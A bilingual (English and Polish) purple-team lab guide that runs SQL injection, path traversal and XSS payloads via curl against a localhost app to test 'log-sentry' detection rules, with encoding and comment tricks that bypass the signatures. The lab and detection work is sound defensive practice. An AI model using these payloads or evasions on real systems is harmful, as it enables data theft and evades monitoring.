# Homelab Purple Team Scenarios & Evasion Exercises

[English](#english) | [Polski](#polski)

---

<a name="english"></a>
## English

A practical guide outlining hands-on exercises designed to simulate web application attacks (Red Team) and evaluate log-based detection rules (Blue Team / `log-sentry`).

---

### Purple Teaming Feedback Loop

```text
 ┌──────────────┐       ┌──────────────┐       ┌──────────────┐
 │   RED TEAM   │ ----> │    TARGET    │ ----> │  BLUE TEAM   │
 │ Sends attack │       │ Writes       │       │ Analyzes log │
 │ payload      │       │ access.log   │       │ (log-sentry) │
 └──────────────┘       └──────────────┘       └──────┬───────┘
        ▲                                             │
        │             Test evasion / bypass           │
        └─────────────────────────────────────────────┘
```

---

### Scenario 1: SQL Injection (SQLi)

#### 1.1 Standard (Blatant) Attack
A direct attempt to extract database records using a `UNION SELECT` clause:
```bash
curl "http://localhost:8080/products?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users"
```
* **Application Behavior**: The vulnerable endpoint returns the dumped database content (`users` table).
* **Detection in `log-sentry`**: `[DETECTED]` (matched by the `union.*select` pattern).

#### 1.2 Evasion Technique: Inline SQL Comments
In SQL databases such as MySQL or SQLite, inline comments `/**/` act as whitespace separators. A simple detection rule that expects whitespace between SQL keywords can fail to match this pattern:
```bash
curl "http://localhost:8080/products?id=1/**/UNION/**/SELECT/**/null,username,password/**/FROM/**/users"
```
* **Application Behavior**: The database executes the query normally and returns data.
* **Detection in `log-sentry`**: `[BYPASS]` (if the regex relies on literal whitespace delimiters).

---

### Scenario 2: Directory Traversal (LFI)

#### 2.1 Standard (Blatant) Attack
Attempting to access `/etc/passwd` using standard path traversal sequences:
```bash
curl "http://localhost:8080/download?file=../../../../etc/passwd"
```
* **Application Behavior**: The endpoint returns simulated `/etc/passwd` contents.
* **Detection in `log-sentry`**: `[DETECTED]` (matched by `\.\./` and `/etc/passwd`).

#### 2.2 Evasion Technique: URL Encoding
Encoding directory separators `/` as `%2f` or dots `.` as `%2e`:
```bash
curl "http://localhost:8080/download?file=..%2f..%2f..%2f..%2fetc/passwd"
```
* **Application Behavior**: The web application or framework decodes parameters before file access, successfully reading the file.
* **Detection in `log-sentry`**: `[BYPASS]` (if `log-sentry` inspects the raw path without performing `unquote()` first).

#### 2.3 Advanced Technique: Double URL Encoding
```bash
curl "http://localhost:8080/download?file=%252e%252e%252f%252e%252e%252fetc/passwd"
```
Here, the percent symbol `%` is itself encoded as `%25`. In multi-tier environments (e.g. reverse proxy + application server), the proxy may decode the request once while the application decodes it again. A log analyzer inspecting raw logs only sees `%252e` and fails to flag the traversal.

---

### Scenario 3: Cross-Site Scripting (XSS)

#### 3.1 Standard (Blatant) Attack
Direct injection using a classic `<script>` tag:
```bash
curl "http://localhost:8080/search?q=<script>alert('pwned')</script>"
```
* **Detection in `log-sentry`**: `[DETECTED]` (matched by the `<script.*?>` signature).

#### 3.2 Evasion Technique: Event Handlers Without `<script>` Tags
Injecting JavaScript through event handlers in HTML tags such as `<svg>` or `<body>`:
```bash
curl "http://localhost:8080/search?q=<svg/onload=alert(1)>"
curl "http://localhost:8080/search?q=<body/onpageshow=alert(1)>"
```
* **Detection in `log-sentry`**: `[BYPASS]` (avoids `<script>` and `onerror=` filters. *Note: If a generic rule flags `alert\(`, altering the payload to execute another JavaScript function such as `console.log` or `document.location` completely evades detection).*

---

### Scenario 4: User-Agent Fingerprinting

Automated security tools (e.g. `sqlmap`, `nikto`) include distinct identifying strings in the `User-Agent` header by default:
```bash
curl -H "User-Agent: sqlmap/1.7.11#stable (https://sqlmap.org)" "http://localhost:8080/products?id=1"
```
* **Detection Consideration**: If an analysis tool only inspects the request `path`, scanner traffic during the reconnaissance phase remains unnoticed until a recognizable exploit payload is delivered.

---

### Step-by-Step Exercise Execution

1. Clear the access log:
   ```bash
   ./lab.sh clean
   ```
2. Start the lab environment:
   ```bash
   ./lab.sh start
   ```
3. Execute simulated attacks:
   ```bash
   ./lab.sh attack all
   ```
4. Review detection results:
   ```bash
   ./lab.sh analyze
   ```
5. Identify which evasion vectors bypassed detection and refine the corresponding signatures in `log-sentry`.

---

<a name="polski"></a>
## Wersja Polska

Praktyczny przewodnik zawierający ćwiczenia z symulacji ataków webowych (Red Team) oraz weryfikacji skuteczności reguł detekcji w logach serwerowych (Blue Team / `log-sentry`).

---

### Pętla testowa Purple Teamingu (Feedback Loop)

```text
 ┌──────────────┐       ┌──────────────┐       ┌──────────────┐
 │   RED TEAM   │ ----> │    TARGET    │ ----> │  BLUE TEAM   │
 │ Wysłanie     │       │ Zapisanie    │       │ Analiza logu │
 │ ataku        │       │ access.log   │       │ (log-sentry) │
 └──────────────┘       └──────────────┘       └──────┬───────┘
        ▲                                             │
        │           Próba ominięcia (Evasion)         │
        └─────────────────────────────────────────────┘
```

---

### Scenariusz 1: SQL Injection (SQLi)

#### 1.1 Atak standardowy (jawny)
Bezpośrednia próba wyciągnięcia danych z bazy przy użyciu klauzuli `UNION SELECT`:
```bash
curl "http://localhost:8080/products?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users"
```
* **Zachowanie aplikacji**: Podatny endpoint zwraca zrzuconą zawartość tabeli `users`.
* **Detekcja w `log-sentry`**: `[WYKRYTO]` (dopasowanie do sygnatury `union.*select`).

#### 1.2 Technika omijania: komentarze inline w SQL
W bazach danych takich jak MySQL czy SQLite komentarz `/**/` pełni funkcję separatora białego znaku. Proste reguły detekcyjne oczekujące spacji między słowami kluczowymi mogą pominąć takie zapytanie:
```bash
curl "http://localhost:8080/products?id=1/**/UNION/**/SELECT/**/null,username,password/**/FROM/**/users"
```
* **Zachowanie aplikacji**: Baza wykonuje zapytanie poprawnie i zwraca dane.
* **Detekcja w `log-sentry`**: `[BYPASS]` (jeśli wyrażenie regularne wymaga spacji między słowami).

---

### Scenariusz 2: Directory Traversal (LFI)

#### 2.1 Atak standardowy (jawny)
Próba odczytania pliku `/etc/passwd` przy użyciu standardowej sekwencji przejścia katalogów:
```bash
curl "http://localhost:8080/download?file=../../../../etc/passwd"
```
* **Zachowanie aplikacji**: Aplikacja zwraca symulowaną zawartość pliku `/etc/passwd`.
* **Detekcja w `log-sentry`**: `[WYKRYTO]` (dopasowanie do wzorców `\.\./` oraz `/etc/passwd`).

#### 2.2 Technika omijania: kodowanie URL
Kodowanie ukośnika `/` jako `%2f` lub kropki `.` jako `%2e`:
```bash
curl "http://localhost:8080/download?file=..%2f..%2f..%2f..%2fetc/passwd"
```
* **Zachowanie aplikacji**: Serwer lub aplikacja dekoduje parametr przed sięgnięciem do systemu plików, co pozwala na odczyt.
* **Detekcja w `log-sentry`**: `[BYPASS]` (jeśli `log-sentry` analizuje surowy ciąg bez wywołania `unquote()` przed dopasowaniem).

#### 2.3 Technika zaawansowana: podwójne kodowanie URL
```bash
curl "http://localhost:8080/download?file=%252e%252e%252f%252e%252e%252fetc/passwd"
```
Znak `%` zostaje zakodowany jako `%25`. W środowiskach wielowarstwowych (reverse proxy + aplikacja) żądanie może zostać zdekodowane dwukrotnie. Analizator logów badający surowy format widzi jedynie ciąg `%252e` i pomija zagrożenie.

---

### Scenariusz 3: Cross-Site Scripting (XSS)

#### 3.1 Atak standardowy (jawny)
Wstrzyknięcie z użyciem klasycznego znacznika `<script>`:
```bash
curl "http://localhost:8080/search?q=<script>alert('pwned')</script>"
```
* **Detekcja w `log-sentry`**: `[WYKRYTO]` (dopasowanie do sygnatury `<script.*?>`).

#### 3.2 Technika omijania: obsługa zdarzeń bez znacznika `<script>`
Wstrzyknięcie kodu JavaScript za pomocą atrybutów obsługi zdarzeń w tagach takich jak `<svg>` lub `<body>`:
```bash
curl "http://localhost:8080/search?q=<svg/onload=alert(1)>"
curl "http://localhost:8080/search?q=<body/onpageshow=alert(1)>"
```
* **Detekcja w `log-sentry`**: `[BYPASS]` (omija filtry weryfikujące obecność `<script>` oraz `onerror=`. *Uwaga: jeśli reguła analizuje sam fragment `alert\(`, zamiana wywołania na inną funkcję JS, np. `console.log` lub `document.location`, pozwala na pełne ominięcie detekcji).*

---

### Scenariusz 4: Identyfikacja narzędzi (User-Agent Fingerprinting)

Automatyczne skanery (np. `sqlmap`, `nikto`) domyślnie wysyłają charakterystyczne ciągi identyfikacyjne w nagłówku `User-Agent`:
```bash
curl -H "User-Agent: sqlmap/1.7.11#stable (https://sqlmap.org)" "http://localhost:8080/products?id=1"
```
* **Wniosek detekcyjny**: Jeśli narzędzie analizuje wyłącznie ścieżkę żądania (`path`), aktywność skanera w fazie wstępnego badania pozostaje niewidoczna w logach aż do momentu wysłania oczywistego ładunku ataku.

---

### Realizacja ćwiczenia krok po kroku

1. Wyczyszczenie pliku logów:
   ```bash
   ./lab.sh clean
   ```
2. Uruchomienie środowiska:
   ```bash
   ./lab.sh start
   ```
3. Wykonanie symulacji ataków:
   ```bash
   ./lab.sh attack all
   ```
4. Weryfikacja wyników detekcji:
   ```bash
   ./lab.sh analyze
   ```
5. Analiza zapytań, które ominęły sygnatury, oraz wprowadzenie odpowiednich poprawek reguł w `log-sentry`.
